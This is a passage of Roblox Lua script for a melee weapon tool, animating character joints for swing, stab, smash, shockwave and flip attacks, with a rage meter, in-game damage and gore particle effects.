RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(i), 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-i), 0, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(i/8), 0, math.rad(-i/6))
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-i/8), 0, math.rad(i/6))
neck.C0 = necko * CFrame.Angles(math.rad(-i/2), 0, 0)
if selected == false or torso.Velocity.magnitude > 2 or Able == false or RestingAnim == true then break end
wait()
end
normal()
end
function runanim()
RLW.Part1 = nil
LLW.Part1 = nil
end
coroutine.resume(coroutine.create(function()
while true do
wait()
if selected and Able == true and RestingAnim == false then
if torso.Velocity.magnitude < 2 then
idleanim()
wait()
else
runanim()
wait()
end
end
end
end))
function selectanim()
if RestingAnim == false and Able == true then
local ah = CFrame.Angles(0, 0, math.rad(90))
RAW.Part1 = Rarm
for i = 0, 270, 270/5 do
RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i/5))
wait()
end
HW.C0 = ah
HW.Part1 = handle
TH.Part1 = nil
PlaySound(equip)
for i = 270, 70, -200/13 do
RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
neck.C0 = necko * CFrame.Angles(math.rad((i-270)/7), 0, math.rad(-i/5))
wait()
end
attach()
for i = 70, 120, 50/8 do
local asd = i-70
RAW.C0 = CFrame.new(-(i-70)/240, 0, -i/500) * CFrame.Angles(math.rad(70), math.rad(70/4+(i-70)), math.rad(-(i-70)/4))
LAW.C0 = CFrame.Angles(math.rad(asd*1.5), 0, math.rad(asd/2)) * CFrame.new(asd/100, -asd/70, 0)
HW.C0 = ah * CFrame.Angles(0, 0, math.rad(-asd*1.8))
neck.C0 = necko * CFrame.Angles(math.rad(-200/7+(asd/2)), 0, math.rad(-70/5+(asd/5)))
RLW.C0 = CFrame.Angles(0, 0, math.rad(asd/4))
LLW.C0 = CFrame.Angles(0, 0, math.rad(-asd/4))
wait()
end
if RAWStand == nil then
RAWStand = RAW.C0
LAWStand = LAW.C0
RLWStand = RLW.C0
LLWStand = LLW.C0
HWStand = HW.C0
end
normal()
end
end
function deselanim()
if RestingAnim == false and Able == true then
local ah = CFrame.Angles(0, 0, math.rad(90))
for i = 120, 70, -50/8 do
local asd = i-70
RAW.C0 = CFrame.new(-(i-70)/240, 0, -i/500) * CFrame.Angles(math.rad(70), math.rad(70/4+(i-70)), math.rad(-(i-70)/4))
LAW.C0 = CFrame.Angles(math.rad(asd*1.5), 0, math.rad(asd/2)) * CFrame.new(asd/100, -asd/70, 0)
HW.C0 = ah * CFrame.Angles(0, 0, math.rad(-asd*1.8))
neck.C0 = necko * CFrame.Angles(math.rad(-200/7+(asd/2)), 0, math.rad(-70/5+(asd/5)))
RLW.C0 = CFrame.Angles(0, 0, math.rad(asd/4))
LLW.C0 = CFrame.Angles(0, 0, math.rad(-asd/4))
wait()
end
LLW.Part1 = nil
RLW.Part1 = nil
LAW.Part1 = nil
for i = 70, 270, 200/13 do
RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
neck.C0 = necko * CFrame.Angles(math.rad((i-270)/7), 0, math.rad(-i/5))
wait()
end
HW.C0 = ah
HW.Part1 = nil
TH.Part1 = handle
for i = 270, 0, -270/6 do
RAW.C0 = CFrame.new(0, 0, -i/500) * CFrame.Angles(math.rad(i), math.rad(i/4), 0)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-i/5))
wait()
end
neck.C0 = necko
detach(true)
end
end
function smash(mouse)
attach()
local mouseHit = mouse
local Orig = torso.CFrame
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.position = Orig.p
local CF = ComputePos(Orig.p, mouseHit)
local CF2 = CF
bg.cframe = CF2
PlaySound(slash)
for i = 0, 1, Prop.AS*1.1 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(80*i), 0, math.rad(45*i)) * CFrame.new(0, -0.4*i, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(75*i), 0, math.rad(40*i)) * CFrame.new(0, -0.5*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(20*i), math.rad(16*i), math.rad(-8*i))
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30*i), math.rad(-16*i), math.rad(8*i))
HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(30*i))
neck.C0 = necko * CFrame.Angles(math.rad(-35*i), 0, math.rad(-10*i))
wait()
end
bp.position = CF * CFrame.new(0, 0, -1.1).p
StartEffect(maintip)
Hurt = true
for i = 0, 1, Prop.AS*1.5 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-150*i), math.rad(-45*i), math.rad(45-140*i)) * CFrame.new(0, -0.4, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(75-180*i), math.rad(80*i), math.rad(40-20*i)) * CFrame.new(0, -0.5, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-50*i), math.rad(16-16*i), math.rad(-8+8*i))
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30+40*i), math.rad(-16+16*i), math.rad(8-8*i))
HW.C0 = HWStand * CFrame.Angles(math.rad(-48*i), 0, math.rad(30))
neck.C0 = necko * CFrame.Angles(math.rad(-35+75*i), 0, math.rad(-10+26*i))
wait()
end
Hurt = false
EndEffect()
PlaySound(smashsound)
bp.position = CF * CFrame.new(0, 0, -1.9).p
for i = 0, 1, Prop.AS do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-150+80*i), math.rad(-45+45*i), math.rad(45-140+95*i)) * CFrame.new(0, -0.4+0.4*i, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(75-180+105*i), math.rad(80-80*i), math.rad(20-20*i)) * CFrame.new(0, -0.5+0.5*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-50+30*i), 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-30+40-10*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(math.rad(-48+48*i), 0, math.rad(30-30*i))
neck.C0 = necko * CFrame.Angles(math.rad(-35+75-40*i), 0, math.rad(-10+26-16*i))
wait()
end
normal()
bg:remove()
bp:remove()
end
function swing(mouse)
attach()
local mouseHit = mouse
local Orig = torso.CFrame
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.position = Orig.p
local CF = ComputePos(Orig.p, mouseHit)
local CF2 = CF
bg.cframe = CF2
PlaySound(slash)
for i = 0, 1, Prop.AS*1.5 do
RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(-140*i), 0) * CFrame.new(0, 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(25*i), 0, math.rad(20*i)) * CFrame.new(0, -0.4*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(20*i), 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, math.rad(-10*i), 0)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50*i))
bg.cframe = CF2 * CFrame.Angles(0, math.rad(-40*i), 0)
wait()
end
Hurt = true
StartEffect(maintip)
for i = 0, 1, Prop.AS*1.3 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(70*i), math.rad(-140), 0) * CFrame.new(0, -0.9*i, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(25), 0, math.rad(20-100*i)) * CFrame.new(0, -0.4+0.6*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(20), 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10), 0, 0)
HW.C0 = HWStand * CFrame.Angles(math.rad(-70*i), math.rad(-15), 0) * CFrame.new(0, 0, -0.9*i)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50+90*i))
bg.cframe = CF2 * CFrame.Angles(0, math.rad(-40+80*i), 0)
wait()
end
EndEffect()
Hurt = false
for i = 0, 1, Prop.AS*0.8 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(70-70*i), math.rad(-140+140*i), 0) * CFrame.new(0, -0.9+0.9*i, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(25-25*i), 0, math.rad(20-100+80*i)) * CFrame.new(0, -0.4+0.6-0.2*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(20-20*i), 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10+10*i), 0, 0)
HW.C0 = HWStand * CFrame.Angles(math.rad(-70+70*i), math.rad(-15+15*i), 0) * CFrame.new(0, 0, -0.9+0.9*i)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(-50+90-40*i))
bg.cframe = CF2 * CFrame.Angles(0, math.rad(40-40*i), 0)
wait()
end
normal()
bg:remove()
bp:remove()
end
function stab(mouse)
attach()
local mouseHit = mouse
local Orig = torso.CFrame
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.position = Orig.p
local CF = ComputePos(Orig.p, mouseHit)
local CF2 = CF
bg.cframe = CF2
PlaySound(slash)
for i = 0, 1, Prop.AS do
RAW.C0 = RAWStand * CFrame.new(0, 0.6*i, 0) * CFrame.Angles(math.rad(-60*i), math.rad(-40*i), math.rad(-30*i)) * CFrame.new(-0.45*i, 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50*i), 0, math.rad(40*i)) * CFrame.new(0, -0.6*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(3*i), math.rad(20*i), math.rad(-10*i))
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3*i), math.rad(-20*i), math.rad(10*i))
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1*i)
neck.C0 = necko * CFrame.Angles(math.rad(25*i), 0, math.rad(-45*i))
bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30*i), 0)
wait()
end
StartEffect(maintip)
Hurt = true
bp.position = CF * CFrame.new(0, 0, -0.6).p
for i = 0, 1, Prop.AS*1.5 do
RAW.C0 = RAWStand * CFrame.new(0, 0.6-0.8*i, 0) * CFrame.Angles(math.rad(-60+100*i), math.rad(-40), math.rad(-30+70*i)) * CFrame.new(-0.45, 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50+60*i), 0, math.rad(40-30*i)) * CFrame.new(0, -0.6-0.4*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(3-18*i), math.rad(20-40*i), math.rad(-10+20*i))
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3+18*i), math.rad(-20+40*i), math.rad(10-20*i))
HW.C0 = HWStand * CFrame.Angles(math.rad(-70*i), 0, 0) * CFrame.new(0, 0, 1-1.4*i)
neck.C0 = necko * CFrame.Angles(math.rad(25-20*i), 0, math.rad(-45+35*i))
bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30+45*i), 0)
wait()
end
Hurt = false
EndEffect()
bp.position = CF.p
for i = 0, 1, Prop.AS*1.1 do
RAW.C0 = RAWStand * CFrame.new(0, 0.6-0.8+0.2*i, 0) * CFrame.Angles(math.rad(-60+100-40*i), math.rad(-40+40*i), math.rad(-30+70-40*i)) * CFrame.new(-0.45+0.45*i, 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-50+60-10*i), 0, math.rad(40-30-10*i)) * CFrame.new(0, -0.6-0.4+1*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(3-18+15*i), math.rad(20-40+20*i), math.rad(-10+20-10*i))
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-3+18-15*i), math.rad(-20+40-20*i), math.rad(10-20+10*i))
HW.C0 = HWStand * CFrame.Angles(math.rad(-70+70*i), 0, 0) * CFrame.new(0, 0, 1-1.4+0.4*i)
neck.C0 = necko * CFrame.Angles(math.rad(5-5*i), 0, math.rad(-10+10*i))
bg.cframe = CF2 * CFrame.Angles(0, math.rad(-30+45-15*i), 0)
wait()
end
normal()
bg:remove()
bp:remove()
end
function epicsmashfunc(hit)
local ch = hit.Parent
local h = getHumanoid(ch)
local t, head = ch:findFirstChild("Torso"), ch:findFirstChild("Head")
return h, t, head
end
function epicsmash(mouse)
if Prop.Rage >= 50 then
attach()
local mouseHit = mouse
local Orig = torso.CFrame
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.position = Orig.p
local CF = ComputePos(Orig.p, mouseHit)
bg.cframe = CF
local hu, to, head = nil, nil, nil
local Epic = true
local conn = Lleg.Touched:connect(function(hit)
if Epic then
hu, to, head = epicsmashfunc(hit)
if hu and to and head then Epic = false end
end
end)
PlaySound(slash)
for i = 0, 1, 0.12 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160*i), math.rad(-30*i), math.rad(-80*i)) * CFrame.new(0, 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80*i), 0, math.rad(-70*i)) * CFrame.new(0, -0.4*i, 0.6*i)
RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20*i)) * CFrame.new(0, 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(115*i), 0, math.rad(-40*i)) * CFrame.new(0, -0.8*i, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2*i)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52*i))
bg.cframe = CF * CFrame.Angles(math.rad(10*i), math.rad(-45*i), math.rad(-15*i))
wait()
end
conn:disconnect()
if hu and to and head then
Prop.Rage = Prop.Rage - 50
hu.PlatformStand = true
local bg2 = Add.BG(to)
bg2.P = 6000
bg2.cframe = CF * CFrame.Angles(math.rad(90), math.rad(180), math.rad(90))
local bp2 = Add.BP(to)
bp2.position = CF * CFrame.new(-1, -4, -4).p
bp2.P = 5000
wait(0.1)
for i = 0, 1, 0.045 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270*i), math.rad(-30+20*i), math.rad(-80+120*i))
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140*i), 0, math.rad(-70+120*i)) * CFrame.new(0, -0.4-0.1*i, 0.6-0.6*i)
RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20-20*i)) * CFrame.new(0, 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(115-115*i), 0, math.rad(-40+40*i)) * CFrame.new(0, -0.8+0.8*i, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2-2*i)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-37*i))
bg.cframe = CF * CFrame.Angles(math.rad(10-10*i), math.rad(-45+35*i), math.rad(-15+15*i))
wait()
end
PlaySound(slash)
bp2:remove()
bg2:remove()
wait(0.2)
StartEffect(maintip)
for i = 0, 1, 0.1 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270-190*i), math.rad(-30+20-35*i), math.rad(-80+120-135*i))
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140-150*i), math.rad(60*i), math.rad(-70+120-40*i)) * CFrame.new(0, -0.4-0.1, 0)
RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
HW.C0 = HWStand * CFrame.Angles(math.rad(-55*i), 0, math.rad(30*i)) * CFrame.new(0, 0, -1*i)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-37+30*i))
bg.cframe = CF * CFrame.Angles(math.rad(10-10), math.rad(-45+35-30*i), math.rad(-15+15))
wait()
end
coroutine.resume(coroutine.create(function()
local frr = Cam.CoordinateFrame
for i = 1, math.random(3,6) do
wait()
Cam.CoordinateFrame = frr * CFrame.new(math.random(-6,6)/10, math.random(-6,6)/10, math.random(-6,6)/10)
end
end))
PlaySound(smashsound)
EndEffect()
local pos = head.Position
if (pos - maintip.Position).magnitude < 2 then
damage(hu, head, 0.3, hu.Health, hu.Health)
head:remove()
PlaySound(hitsound)
for i = 1, math.random(7, 17) do
local hmm = math.random(1,6)
if hmm < 6 then
local cols = {"Bright red", "Really red"}
local p = Part(workspace, false, false, 0, 0, cols[math.random(1,#cols)], math.random(2,10)/10, 0.2, math.random(2,10)/10)
p.CFrame = CFrame.new(pos) * CFrame.new(math.random(-6,6)/10, math.random(-4,2)/10, math.random(-6, 6)/10)
p.Velocity = Vector3.new(math.random(-15, 15), math.random(5, 40), math.random(-15, 15))
p.RotVelocity = Vector3.new(math.random(-25,25), math.random(-25,25), math.random(-25,25))
else
local cols = {"Institutional white", "White"}
local p = Part(workspace, false, false, 0, 0, cols[math.random(1,#cols)], math.random(4,13)/10, 0.3, math.random(2,3)/10)
p.CFrame = CFrame.new(pos) * CFrame.new(math.random(-6,6)/10, math.random(-4,2)/10, math.random(-6, 6)/10)
p.Velocity = Vector3.new(math.random(-15, 15), math.random(5, 40), math.random(-15, 15))
p.RotVelocity = Vector3.new(math.random(-25,25), math.random(-25,25), math.random(-25,25))
end
end
end
for i = 0, 1, 0.06 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+270-190+80*i), math.rad(-30+20-35+45*i), math.rad(-80+120-135+95*i))
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+140-150+90*i), math.rad(60-60*i), math.rad(10-10*i)) * CFrame.new(0, -0.4-0.1+0.5*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0)
HW.C0 = HWStand * CFrame.Angles(math.rad(-55+55*i), 0, math.rad(30-30*i)) * CFrame.new(0, 0, -1+1*i)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(45-45*i))
bg.cframe = CF * CFrame.Angles(0, math.rad(-45+35-20+30*i), 0)
wait()
end
else
for i = 0, 1, 0.08 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-160+160*i), math.rad(-30+30*i), math.rad(-80+80*i)) * CFrame.new(0, 0, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-80+80*i), 0, math.rad(-70+70*i)) * CFrame.new(0, -0.4+0.4*i, 0.6-0.6*i)
RLW.C0 = RLWStand * CFrame.Angles(0, 0, math.rad(20-20*i)) * CFrame.new(0, 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(115-115*i), 0, math.rad(-40+40*i)) * CFrame.new(0, -0.8+0.8*i, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 2-2*i)
neck.C0 = necko * CFrame.Angles(0, 0, math.rad(52-52*i))
bg.cframe = CF * CFrame.Angles(math.rad(10-10*i), math.rad(-45+45*i), math.rad(-15+15*i))
wait()
end
bg:remove()
bp:remove()
normal()
end
normal()
bg:remove()
bp:remove()
end
end
function shockwave(mouse)
local p, t = RayCast(torso.Position, torso.CFrame * CFrame.new(0, -5, 0).p, 5, 1)
if Prop.Rage >= 80 and t then
Prop.Rage = Prop.Rage - 80
attach()
local mouseHit = mouse
local Orig = torso.CFrame
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.position = Orig.p
bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
bp.P = 5000
local CF = ComputePos(Orig.p, mouseHit)
bg.cframe = CF
PlaySound(charge)
for i = 0, 1, 0.07 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-110*i), math.rad(-40*i), math.rad(-50*i)) * CFrame.new(0.2*i, 0, 0.2*i)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100*i), 0, math.rad(-40*i)) * CFrame.new(-0.2*i, -0.4*i, 0.5*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, math.rad(-10*i)) * CFrame.new(0, 0.7*i, -0.8*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75*i), 0, math.rad(10*i)) * CFrame.new(0, 0.4*i, 0.2*i)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6*i)
neck.C0 = necko * CFrame.Angles(math.rad(30*i), 0, 0)
bg.cframe = CF * CFrame.Angles(0, 0, 0)
bp.position = Orig.p + Vector3.new(0, -1.9*i, 0)
wait()
end
for i = 0, 1, 0.04 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-110+220*i), math.rad(-40+50*i), math.rad(-50+90*i)) * CFrame.new(0.2-0.2*i, -0.85*i, 0.2-0.2*i)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100+185*i), 0, math.rad(-40+75*i)) * CFrame.new(-0.2-0.2*i, -0.4-0.05*i, 0.5-0.5*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(15-25*i), 0, math.rad(-10+6*i)) * CFrame.new(0, 0.7-0.7*i, -0.8+0.8*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75+65*i), 0, math.rad(10-6*i)) * CFrame.new(0, 0.4-0.4*i, 0.2-0.2*i)
HW.C0 = HWStand * CFrame.Angles(math.rad(-15*i), 0, 0) * CFrame.new(0, 0, 1.6-2.1*i)
neck.C0 = necko * CFrame.Angles(math.rad(30-70*i), 0, 0)
bg.cframe = CF * CFrame.Angles(0, 0, 0)
bp.position = Orig.p + Vector3.new(0, -1.9+17*i, 0)
wait()
end
bp.P = 12001
wait(0.1)
StartEffect(maintip)
PlaySound(slash)
for i = 0, 1, 0.1 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150*i), math.rad(10-30*i), math.rad(40-90*i)) * CFrame.new(0, -0.85+0.85*i, -0.8*i)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-125*i), 0, math.rad(35)) * CFrame.new(0, -0.45+0.1, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(-10+25*i), 0, math.rad(-4+4*i)) * CFrame.new(0, 0.5*i, -0.8*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10-35*i), 0, math.rad(4-4*i)) * CFrame.new(0, 0.4*i, 0.2*i)
HW.C0 = HWStand * CFrame.Angles(math.rad(-15-10*i), 0, 0) * CFrame.new(0, 0, -0.5+0.7*i)
neck.C0 = necko * CFrame.Angles(math.rad(-40+75*i), 0, math.rad(-20*i))
bg.cframe = CF * CFrame.Angles(0, math.rad(380*i), 0)
bp.position = Orig.p + Vector3.new(0, 15.1-16.7*i, 0)
wait()
end
coroutine.resume(coroutine.create(function()
local frr = Cam.CoordinateFrame
for i = 1, math.random(10,16) do
wait()
Cam.CoordinateFrame = frr * CFrame.new(math.random(-15,15)/10, math.random(-15,15)/10, math.random(-15,15)/10)
end
end))
PlaySound(smashsound)
local pos = CF * CFrame.new(-2, -3, -3).p
EndEffect()
local p = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
p.CFrame = CFrame.new(pos)
local p2 = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
p2.CFrame = CFrame.new(pos)
local p3 = Part(workspace, true, false, 0, 0, "Black", 1, 1, 1, true)
p3.CFrame = CFrame.new(pos)
local m3 = Instance.new("SpecialMesh",p3)
m3.MeshType = "Sphere"
PlaySound(boom)
local m2 = Instance.new("CylinderMesh",p2)
local m = Add.Mesh(p, "http://www.roblox.com/asset/?id=20329976", 1, 1.2, 1)
local tab = {}
coroutine.resume(coroutine.create(function()
for x = 0, 1.04, 0.04 do
wait()
local thing = 33*x
m.Scale = Vector3.new(21*x, 5*x, 21*x)
m2.Scale = Vector3.new(thing, 1, thing)
m3.Scale = Vector3.new(thing*0.93, thing*0.7, thing*0.93)
p.Transparency = x
p2.Transparency = x
p3.Transparency = x
for i, v in pairs(workspace:children()) do
local h = getHumanoid(v)
local to = v:findFirstChild("Torso")
if h ~= nil and to ~= nil and find(tab, v) == nil then
if (to.Position - pos).magnitude < (thing/2) then
damage(h, to, 0.5, Prop.ShockDMG/2, Prop.ShockDMG)
to.Velocity = CFrame.new(pos, to.Position).lookVector * 60
to.RotVelocity = Vector3.new(math.random(-30, 30), math.random(-30, 30), math.random(-30, 30))
h.PlatformStand = true
table.insert(tab, v)
coroutine.resume(coroutine.create(function() wait(1.2) h.PlatformStand = false end))
end
end
end
end
p:remove()
p2:remove()
p3:remove()
end))
wait(0.8)
for i = 0, 1, Prop.AS*0.8 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150+40*i), math.rad(10-30+20*i), math.rad(40-90+50*i)) * CFrame.new(0, 0, -0.8+0.8*i)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-125+40*i), 0, math.rad(35-35*i)) * CFrame.new(0, -0.45+0.1+0.35*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(-10+25-15*i), 0, 0) * CFrame.new(0, 0.5-0.5*i, -0.8+0.8*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10-35+45*i), 0, 0) * CFrame.new(0, 0.4-0.4*i, 0.2-0.2*i)
HW.C0 = HWStand * CFrame.Angles(math.rad(-15-10+25*i), 0, 0) * CFrame.new(0, 0, -0.5+0.7-0.2*i)
neck.C0 = necko * CFrame.Angles(math.rad(-40+75-35*i), 0, math.rad(-20+20*i))
bg.cframe = CF * CFrame.Angles(0, 0, 0)
bp.position = Orig.p + Vector3.new(0, 15.1-16.7+1.6*i, 0)
wait()
end
normal()
bg:remove()
bp:remove()
end
end
function flipsmash(mouse)
local Orig = torso.CFrame
local mouseHit = mouse
local CF = ComputePos(Orig.p, mouseHit)
local p, t = RayCast(torso.Position, torso.Position + Vector3.new(0, -5, 0), 5, 0.5)
local ahp = (CF * CFrame.new(0, 0, -14.5))
local p2, t2 = RayCast(ahp.p, (ahp * CFrame.new(0, -5, 0)).p, 5, 0.5)
if t and t2 and Prop.Rage >= 90 then
Prop.Rage = Prop.Rage - 90
attach()
local bg = Add.BG(torso)
local bp = Add.BP(torso)
bp.position = Orig.p
bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
bg.cframe = CF
local cen = CF * CFrame.new(0, -1.2, -1.5-6.5)
for i = 0, 1, 0.08 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100*i), math.rad(-50*i), math.rad(-50*i)) * CFrame.new(0.2*i, 0, 0.2*i)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100*i), 0, math.rad(-40*i)) * CFrame.new(-0.2*i, -0.4*i, 0.5*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, math.rad(-10*i)) * CFrame.new(0, 0.7*i, -1*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75*i), 0, math.rad(10*i)) * CFrame.new(0, 0.4*i, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6*i)
neck.C0 = necko * CFrame.Angles(math.rad(30*i), 0, 0)
bg.cframe = CF * CFrame.Angles(0, 0, 0)
bp.position = CF * CFrame.new(0, -1.2*i, -1.5*i).p
wait()
end
wait(0.15)
hum.PlatformStand = true
for i = 0, 1, 0.13 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100-70*i), math.rad(-50), math.rad(-50)) * CFrame.new(0.2, 0, 0.2)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100-50*i), 0, math.rad(-40+30*i)) * CFrame.new(-0.2, -0.4, 0.5)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(15-10*i), 0, math.rad(-10)) * CFrame.new(0, 0.7-0.7*i, -1+1*i)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75+70*i), 0, math.rad(10)) * CFrame.new(0, 0.4-0.4*i, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6)
neck.C0 = necko * CFrame.Angles(math.rad(30-40*i), 0, 0)
bg.cframe = CF * CFrame.Angles(math.rad(-90*i), 0, 0)
bp.position = cen * CFrame.Angles(math.rad(180-45*i), 0, 0) * CFrame.new(0, 0, -6.5).p
wait()
end
PlaySound(slash)
for i = 0, 1, 0.13 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100-70-80*i), math.rad(-50+60*i), math.rad(-50+90*i)) * CFrame.new(0.2-0.2*i, -0.85*i, 0.2-0.2*i)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100-50-125*i), 0, math.rad(-40+30+45*i)) * CFrame.new(-0.2+0.2*i, -0.4-0.5*i, 0.5-0.5*i)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(5), 0, math.rad(-10)) * CFrame.new(0, 0, 0)
LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5), 0, math.rad(10)) * CFrame.new(0, 0, 0)
HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6-2.6*i)
neck.C0 = necko * CFrame.Angles(math.rad(-10), 0, 0)
bg.cframe = CF * CFrame.Angles(math.rad(-90-90*i), 0, 0)
bp.position = cen * CFrame.Angles(math.rad(180-45-45*i), 0, 0) * CFrame.new(0, 0, -6.5).p
wait()
end
StartEffect(maintip)
PlaySound(slash)
for i = 0, 1, 0.06 do
RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150*i), math.rad(10-50*i), math.rad(40-85*i)) * CFrame.new(0, -0.85+0.45*i, 0)
LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-130*i), 0, math.rad(35)) * CFrame.new(0, -0.9+0.3*i, 0)
RLW.C0 = RLWStand * CFrame.Angles(math.rad(5-80*i), 0, math.rad(-10)) * CFrame.new(0, 0.4*i, 0)
